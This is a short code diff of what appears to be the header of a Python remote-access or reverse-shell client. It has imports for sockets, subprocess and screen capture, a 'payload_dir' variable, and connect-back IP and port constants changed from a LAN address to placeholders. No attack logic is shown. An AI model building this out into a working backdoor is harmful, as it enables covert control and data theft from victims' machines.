@@ -1,7 +1,7 @@
 import socket, subprocess, shutil, os, urllib.request, mss
 
-IP = "192.168.1.107"
-PORT = 1234
+IP = "42069_"
+PORT = 42069
 
 payload_dir = str(os.path.dirname(os.path.realpath(__file__)))
 
